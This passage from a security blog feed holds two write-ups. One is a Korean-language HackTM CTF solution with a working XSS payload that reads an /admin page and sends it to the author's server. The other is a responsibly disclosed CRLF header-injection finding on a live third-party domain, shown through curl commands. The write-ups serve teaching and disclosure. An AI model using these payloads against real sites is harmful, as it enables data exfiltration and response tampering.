사용하는 정규식이 상당히 번잡한데, url의 <code>.</code> 문자가 escape 되지 않고 모든 문자와 매칭되도록 하고 있습니다.<br>따라서 <code>https://javascript:80/1-%60html;t/aa/b/c,pa?a=1%60,alert(1)</code> 를 통해 우회할 수 있습니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> isValidJSURL = <span class="function"><span class="keyword">function</span> (<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!(url.toLowerCase().startsWith(<span class="string">"http://"</span>) || url.toLowerCase().startsWith(<span class="string">'https://'</span>))) &#123;</span><br><span class="line">        url = <span class="string">'https://'</span> +  url;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> toOpenUrl;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        toOpenUrl = <span class="keyword">new</span> URL(url);</span><br><span class="line">        <span class="keyword">return</span> toOpenUrl.origin !== <span class="string">'null'</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>isValidJSURL</code> 함수에서는 주어진 <code>url</code> 의 <code>origin</code> 을 확인하는데 <code>https://javascript:80/1-%60html;t/aa/b/c,pa?a=1%60,alert(1)</code> 의 경우 <code>javascript:80</code> 을 origin 으로 인식합니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; csp</span><br><span class="line">Content-Security-Policy: base-uri &#39;self&#39;; block-all-mixed-content; frame-ancestors &#39;self&#39;; object-src &#39;none&#39;; connect-src &#39;self&#39;; frame-src &#39;self&#39; https:&#x2F;&#x2F;www.youtube.com https:&#x2F;&#x2F;www.google.com; script-src &#39;self&#39; &#39;unsafe-inline&#39; https:&#x2F;&#x2F;cdnjs.cloudflare.com https:&#x2F;&#x2F;www.google.com&#x2F;recaptcha&#x2F;api.js https:&#x2F;&#x2F;www.gstatic.com&#x2F;recaptcha&#x2F;; report-uri &#x2F;api&#x2F;report-csp</span><br><span class="line">&#x2F;&#x2F; app.js</span><br><span class="line">Object.freeze(location);</span><br></pre></td></tr></table></figure><p>위에서 필터링 함수를 우회하는데에 성공하면 <code>hash</code> 값을 조작함으로써 마음대로 스크립트를 실행할 수 있는데, csp와 <code>Object.freeze(location)</code> 을 통해 외부로 데이터 전송을 방지하고 있습니다.<br>하지만 <code>top.location.replace(&#39;...&#39;)</code> 을 통해 <code>location</code> 이동을 하여 외부로 데이터를 보내도록 할 수 있습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;178.128.175.6:20900&#x2F;#javascript:80&#x2F;1-%60html;t&#x2F;aa&#x2F;b&#x2F;c,pa?a&#x3D;1%60,fetch(&#39;&#x2F;admin&#39;).then(x&#x3D;%3Ex.text()).then(x&#x3D;%3Etop.location.replace(&#39;&#x2F;&#x2F;rwx.kr&#x2F;?&#39;%2bbtoa(x)))</span><br></pre></td></tr></table></figure><p>위 주소는 <code>/admin</code> 페이지를 가져와 공격자의 서버로 전송하도록 합니다.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- &lt;a href="#/page/sugestii"&gt;Sugestii&lt;/a&gt; --&gt;</span></span><br></pre></td></tr></table></figure><p>페이지를 중간에 위와 같은 주석이 존재하는데, 접속해 보면 아래와 같은 페이지가 보입니다.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">""</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"path"</span> <span class="attr">name</span>=<span class="string">"path"</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">value</span>=<span class="string">"/#/page/acasa"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"csrf_token"</span> <span class="attr">name</span>=<span class="string">"csrf_token"</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">value</span>=<span class="string">"Ijc2NTM2MGNiOTBkZTI4Y2E4ZGExMGRkMTk0NTAwNjE3MGNkNjZmYjAi.XjdpKQ.sFQg9QIAZLFkqSWYsMgfljOT5UA"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">cols</span>=<span class="string">"60"</span> <span class="attr">id</span>=<span class="string">"message"</span> <span class="attr">name</span>=<span class="string">"message"</span> <span class="attr">placeholder</span>=<span class="string">"Scrie parerea ta"</span> <span class="attr">required</span> <span class="attr">rows</span>=<span class="string">"20"</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">'https://www.google.com/recaptcha/api.js'</span> <span class="attr">async</span> <span class="attr">defer</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"g-recaptcha"</span> <span class="attr">data-sitekey</span>=<span class="string">"6LfE7dQUAAAAABOc1rpiWCU0CQF9Msv2XBdvgd5q"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Trimite sugestie"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>hidden</code> 타입의 <code>input</code> 태그를 확인할 수 있는데, 여기에 만든 페이로드인 <code>/#javascript:80/1-%60html;t/aa/b/c,pa?a=1%60,fetch(&#39;/admin&#39;).then(x=%3Ex.text()).then(x=%3Etop.location.replace(&#39;//rwx.kr/?&#39;%2bbtoa(x)))</code> 를 전송해 주면 곧 관리자가 확인하고, <code>/admin</code> 페이지 내용이 수신됩니다.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// log</span><br><span class="line">178.128.175.6 - - [03/Feb/2020:01:33:35 +0900] "GET /?PHA+CkhhY2tUTXs2NzA4ZTdhOGQxYWM4YmZhYWFlYjNmNmFhNzY2YjJjOTAzYmE3ZTgyNjQ2Y2E1YjgzYjVhMjBjOTQwYzU0ZjlhfQo8L3A+Cg== HTTP/1.1" 200 67 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.130 Safari/537.36"</span><br><span class="line">// decoded</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">HackTM&#123;6708e7a8d1ac8bfaaaeb3f6aa766b2c903ba7e82646ca5b83b5a20c940c54f9a&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>데이터에서 플래그를 확인할 수 있습니다.</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HackTM CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Drive.net CRLF Injection</title>
      <link href="/drive-net-crlf-injection/"/>
      <url>/drive-net-crlf-injection/</url>
      
        <content type="html"><![CDATA[<h2 id="desciption"><a href="#desciption" class="headerlink" title="desciption"></a>desciption</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@rwx:~$ curl -v 'http://a.d-cd.net/'</span><br><span class="line">&gt; GET / HTTP/1.1</span><br><span class="line">&gt; Host: a.d-cd.net</span><br><span class="line">&gt; User-Agent: curl/7.58.0</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; </span><br><span class="line"><span class="tag">&lt; <span class="attr">HTTP</span>/<span class="attr">1.1</span> <span class="attr">301</span> <span class="attr">Moved</span> <span class="attr">Permanently</span></span></span><br><span class="line">&lt; Server: nginx</span><br><span class="line"><span class="tag">&lt; <span class="attr">Date:</span> <span class="attr">Tue</span>, <span class="attr">28</span> <span class="attr">Jan</span> <span class="attr">2020</span> <span class="attr">19:39:09</span> <span class="attr">GMT</span></span></span><br><span class="line">&lt; Content-Type: text/html</span><br><span class="line"><span class="tag">&lt; <span class="attr">Content-Length:</span> <span class="attr">162</span></span></span><br><span class="line">&lt; Connection: keep-alive</span><br><span class="line"><span class="tag">&lt; <span class="attr">Location:</span> <span class="attr">https:</span>//<span class="attr">a.d-cd.net</span>/</span></span><br><span class="line">&lt; X-Clacks-Overhead: GNU Terry Pratchett</span><br><span class="line"><span class="tag">&lt; </span></span><br><span class="line">&lt;html&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>301 Moved Permanently<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span>301 Moved Permanently<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span>nginx<span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>I did not understand the contents of the server associated with the domain <code>a.d-cd.net</code> and did not perform analysis on the server.<br>Since <code>a.d-cd.net</code> server basically supports hsts. If you we try http request, It will be redirected to https.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@rwx:~$ curl -v 'https://a.d-cd.net/'</span><br><span class="line">*   Trying 146.255.192.80...</span><br><span class="line">* TCP_NODELAY set</span><br><span class="line">* Connected to a.d-cd.net (146.255.192.80) port 443 (#0)</span><br><span class="line">* ALPN, offering h2</span><br><span class="line">* ALPN, offering http/1.1</span><br><span class="line">* successfully set certificate verify locations:</span><br><span class="line">*   CAfile: /etc/ssl/certs/ca-certificates.crt</span><br><span class="line">  CApath: /etc/ssl/certs</span><br><span class="line">* TLSv1.3 (OUT), TLS handshake, Client hello (1):</span><br><span class="line">* TLSv1.3 (IN), TLS handshake, Server hello (2):</span><br><span class="line">* TLSv1.2 (IN), TLS handshake, Certificate (11):</span><br><span class="line">* TLSv1.2 (IN), TLS handshake, Server key exchange (12):</span><br><span class="line">* TLSv1.2 (IN), TLS handshake, Server finished (14):</span><br><span class="line">* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):</span><br><span class="line">* TLSv1.2 (OUT), TLS change cipher, Client hello (1):</span><br><span class="line">* TLSv1.2 (OUT), TLS handshake, Finished (20):</span><br><span class="line">* TLSv1.2 (IN), TLS handshake, Finished (20):</span><br><span class="line">* SSL connection using TLSv1.2 / ECDHE-ECDSA-AES128-GCM-SHA256</span><br><span class="line">* ALPN, server accepted to use h2</span><br><span class="line">* Server certificate:</span><br><span class="line">*  subject: C=RU; L=\U041C\U043E\U0441\U043A\U0432\U0430; O=DRIVE LLC; CN=*.d-cd.net</span><br><span class="line">*  start date: Nov 29 00:00:00 2019 GMT</span><br><span class="line">*  expire date: Feb  1 12:00:00 2022 GMT</span><br><span class="line">*  subjectAltName: host "a.d-cd.net" matched cert's "*.d-cd.net"</span><br><span class="line">*  issuer: C=US; O=DigiCert Inc; CN=DigiCert SHA2 Secure Server CA</span><br><span class="line">*  SSL certificate verify ok.</span><br><span class="line">* Using HTTP2, server supports multi-use</span><br><span class="line">* Connection state changed (HTTP/2 confirmed)</span><br><span class="line">* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0</span><br><span class="line">* Using Stream ID: 1 (easy handle 0x55bd1505f580)</span><br><span class="line">&gt; GET / HTTP/2</span><br><span class="line">&gt; Host: a.d-cd.net</span><br><span class="line">&gt; User-Agent: curl/7.58.0</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; </span><br><span class="line">* Connection state changed (MAX_CONCURRENT_STREAMS updated)!</span><br><span class="line"><span class="tag">&lt; <span class="attr">HTTP</span>/<span class="attr">2</span> <span class="attr">404</span> </span></span><br><span class="line">&lt; server: nginx</span><br><span class="line"><span class="tag">&lt; <span class="attr">date:</span> <span class="attr">Tue</span>, <span class="attr">28</span> <span class="attr">Jan</span> <span class="attr">2020</span> <span class="attr">19:40:07</span> <span class="attr">GMT</span></span></span><br><span class="line">&lt; content-type: text/html</span><br><span class="line"><span class="tag">&lt; <span class="attr">content-length:</span> <span class="attr">146</span></span></span><br><span class="line">&lt; vary: Accept-Encoding</span><br><span class="line"><span class="tag">&lt; <span class="attr">x-clacks-overhead:</span> <span class="attr">GNU</span> <span class="attr">Terry</span> <span class="attr">Pratchett</span></span></span><br><span class="line">&lt; x-content-type-options: nosniff</span><br><span class="line"><span class="tag">&lt; <span class="attr">strict-transport-security:</span> <span class="attr">max-age</span>=<span class="string">31622400</span></span></span><br><span class="line">&lt; </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>404 Not Found<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span>404 Not Found<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span>nginx<span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">* Connection #0 to host a.d-cd.net left intact</span><br></pre></td></tr></table></figure><p>The next time I tried <code>https</code> request, you will see that the message at the top, supports <code>ALPN</code> and server offers in the order of <code>h2</code> &gt; <code>http/1.1</code>.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@rwx:~$ curl -v https://a.d-cd.net/path</span><br><span class="line">&gt; GET /path HTTP/2</span><br><span class="line">&gt; Host: a.d-cd.net</span><br><span class="line">&gt; User-Agent: curl/7.58.0</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; </span><br><span class="line">* Connection state changed (MAX_CONCURRENT_STREAMS updated)!</span><br><span class="line"><span class="tag">&lt; <span class="attr">HTTP</span>/<span class="attr">2</span> <span class="attr">404</span> </span></span><br><span class="line">&lt; server: nginx</span><br><span class="line"><span class="tag">&lt; <span class="attr">date:</span> <span class="attr">Tue</span>, <span class="attr">28</span> <span class="attr">Jan</span> <span class="attr">2020</span> <span class="attr">19:23:01</span> <span class="attr">GMT</span></span></span><br><span class="line">&lt; content-length: 0</span><br><span class="line"><span class="tag">&lt; <span class="attr">x-request-id:</span> <span class="attr">64624053cd48806af4bbbd43aa200100</span></span></span><br><span class="line">&lt; x-clacks-overhead: GNU Terry Pratchett</span><br><span class="line"><span class="tag">&lt; <span class="attr">x-content-type-options:</span> <span class="attr">nosniff</span></span></span><br><span class="line">&lt; strict-transport-security: max-age=31622400</span><br><span class="line"><span class="tag">&lt; </span></span><br><span class="line"><span class="tag">* <span class="attr">Connection</span> #<span class="attr">0</span> <span class="attr">to</span> <span class="attr">host</span> <span class="attr">a.d-cd.net</span> <span class="attr">left</span> <span class="attr">intact</span></span></span><br></pre></td></tr></table></figure><p>Therefore, when we request a webpage with curl or other browsers that support <code>ALPN</code> will communicate over HTTP/2 .</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@rwx:~$ curl -v https://a.d-cd.net/path?</span><br><span class="line">* Using HTTP2, server supports multi-use</span><br><span class="line">* Connection state changed (HTTP/2 confirmed)</span><br><span class="line">* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0</span><br><span class="line">* Using Stream ID: 1 (easy handle 0x55600336c580)</span><br><span class="line">&gt; GET /path? HTTP/2</span><br><span class="line">&gt; Host: a.d-cd.net</span><br><span class="line">&gt; User-Agent: curl/7.58.0</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; </span><br><span class="line">* Connection state changed (MAX_CONCURRENT_STREAMS updated)!</span><br><span class="line"><span class="tag">&lt; <span class="attr">HTTP</span>/<span class="attr">2</span> <span class="attr">301</span> </span></span><br><span class="line">&lt; server: nginx</span><br><span class="line"><span class="tag">&lt; <span class="attr">date:</span> <span class="attr">Tue</span>, <span class="attr">28</span> <span class="attr">Jan</span> <span class="attr">2020</span> <span class="attr">19:23:20</span> <span class="attr">GMT</span></span></span><br><span class="line">&lt; content-type: text/html</span><br><span class="line"><span class="tag">&lt; <span class="attr">content-length:</span> <span class="attr">162</span></span></span><br><span class="line">&lt; location: https://a.d-cd.net/path</span><br><span class="line"><span class="tag">&lt; <span class="attr">x-clacks-overhead:</span> <span class="attr">GNU</span> <span class="attr">Terry</span> <span class="attr">Pratchett</span></span></span><br><span class="line">&lt; x-content-type-options: nosniff</span><br><span class="line"><span class="tag">&lt; <span class="attr">strict-transport-security:</span> <span class="attr">max-age</span>=<span class="string">31622400</span></span></span><br><span class="line">&lt; </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>301 Moved Permanently<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span>301 Moved Permanently<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span>nginx<span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">* Connection #0 to host a.d-cd.net left intact</span><br></pre></td></tr></table></figure><p>Scanning the server, I noticed something unusual.<br>Regardless of the content, If URL <code>?a=b (search)</code> part exists, server remove it and make us redirect again.<br>I think it’s for caching, but I’m not sure.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;a.d-cd.net&#x2F; (301) -&gt; https:&#x2F;&#x2F;a.d-cd.net&#x2F; (404)</span><br><span class="line">https:&#x2F;&#x2F;a.d-cd.net&#x2F; (404)</span><br><span class="line">https:&#x2F;&#x2F;a.d-cd.net&#x2F;? (301 redirect) -&gt; https:&#x2F;&#x2F;a.d-cd.net&#x2F; (404)</span><br></pre></td></tr></table></figure><p>simply, <code>http</code> request is redirected to <code>https</code>.<br>and <code>https</code> request that contains <code>?...</code> is redirected without <code>?......</code> part.<br>when the part of <code>?</code> is deleted, the part of <code>path</code> makes url decoded in response.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@rwx:~$ curl -v <span class="string">'https://a.d-cd.net/path%0aheader:%20value%0a?'</span></span><br><span class="line">&gt; GET /path%0aheader:%20value%0a? HTTP/2</span><br><span class="line">&gt; Host: a.d-cd.net</span><br><span class="line">&gt; User-Agent: curl/7.58.0</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; </span><br><span class="line">* Connection state changed (MAX_CONCURRENT_STREAMS updated)!</span><br><span class="line">* http2 error: Invalid HTTP header field was received: frame <span class="built_in">type</span>: 1, stream: 1, name: [location], value: [https://a.d-cd.net/path</span><br><span class="line">header: value</span><br><span class="line">]</span><br><span class="line">* HTTP/2 stream 1 was not closed cleanly: PROTOCOL_ERROR (err 1)</span><br><span class="line">* Connection <span class="comment">#0 to host a.d-cd.net left intact</span></span><br><span class="line">curl: (92) HTTP/2 stream 1 was not closed cleanly: PROTOCOL_ERROR (err 1)</span><br></pre></td></tr></table></figure><p>I thought this would be available for <code>crlf injection</code>, but the h2 setting would allow meta-data verification.<br>Blocking was being performed by error when trying to <code>crlf injection</code>.<br>I don’t know if this is intended, but <code>h2</code> errors are preventing malicious headers from being inserted into the browser.</p><p><img src="/img/2020/01/%EC%BA%A1%EC%B2%98.gif" alt="img"></p><p>The above screen shows the occurrence of a <code>http2</code> error in the latest version of Chrome when you connect to the address <code>https://a.d-cd.net/%0aa%0a?</code> (browsers support <code>http2</code> causes the same as curl)</p><p>These errors can work as a mitigation, but It is not sufficient.<br>The browser prefers <code>http2</code> communication, but is server still support <code>http1.1</code> or earlier.<br>When a user connects to a server using a proxy does not support <code>http2</code>, the browsers will connects with <code>http1.1</code><br>so It may makes header injection plainly.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@rwx:~$ curl -v --http1.1 'https://a.d-cd.net/path%0aset-cookie:%20evil=123123;%0acontent-length:%20306%0a?'</span><br><span class="line">&gt; GET /path%0aset-cookie:%20evil=123123;%0acontent-length:%20306%0a? HTTP/1.1</span><br><span class="line">&gt; Host: a.d-cd.net</span><br><span class="line">&gt; User-Agent: curl/7.58.0</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; </span><br><span class="line"><span class="tag">&lt; <span class="attr">HTTP</span>/<span class="attr">1.1</span> <span class="attr">301</span> <span class="attr">Moved</span> <span class="attr">Permanently</span></span></span><br><span class="line">&lt; Server: nginx</span><br><span class="line"><span class="tag">&lt; <span class="attr">Date:</span> <span class="attr">Tue</span>, <span class="attr">28</span> <span class="attr">Jan</span> <span class="attr">2020</span> <span class="attr">19:34:16</span> <span class="attr">GMT</span></span></span><br><span class="line">&lt; Content-Type: text/html</span><br><span class="line"><span class="tag">&lt; <span class="attr">Content-Length:</span> <span class="attr">162</span></span></span><br><span class="line">&lt; Location: https://a.d-cd.net/path</span><br><span class="line"><span class="tag">&lt; <span class="attr">set-cookie:</span> <span class="attr">evil</span>=<span class="string">123123;</span></span></span><br><span class="line">&lt; content-length: 306</span><br><span class="line"><span class="tag">&lt; </span></span><br><span class="line"><span class="tag"><span class="attr">Connection:</span> <span class="attr">keep-alive</span></span></span><br><span class="line"><span class="tag"><span class="attr">X-Clacks-Overhead:</span> <span class="attr">GNU</span> <span class="attr">Terry</span> <span class="attr">Pratchett</span></span></span><br><span class="line"><span class="tag"><span class="attr">X-Content-Type-Options:</span> <span class="attr">nosniff</span></span></span><br><span class="line"><span class="tag"><span class="attr">Strict-Transport-Security:</span> <span class="attr">max-age</span>=<span class="string">31622400</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line">&lt;html&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>301 Moved Permanently<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span>301 Moved Permanently<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span>nginx<span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">* Connection #0 to host a.d-cd.net left intact</span><br></pre></td></tr></table></figure><p>For example, curl sends a request with the <code>http1.1</code> option.<br>You can verify that it is received with the set-cookie header without errors.</p><p>In conclusion, <code>crlf injection</code> is possible if the user uses a <code>proxy</code> or <code>browser</code> that does not support <code>http2 (ALPN)</code>.<br>Any header and content can be inserted into the response packet.</p><hr><ul><li>20/01/29 Reported</li><li>20/01/31 Patched</li></ul>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
      </categories>
      
      
        <tags>
            
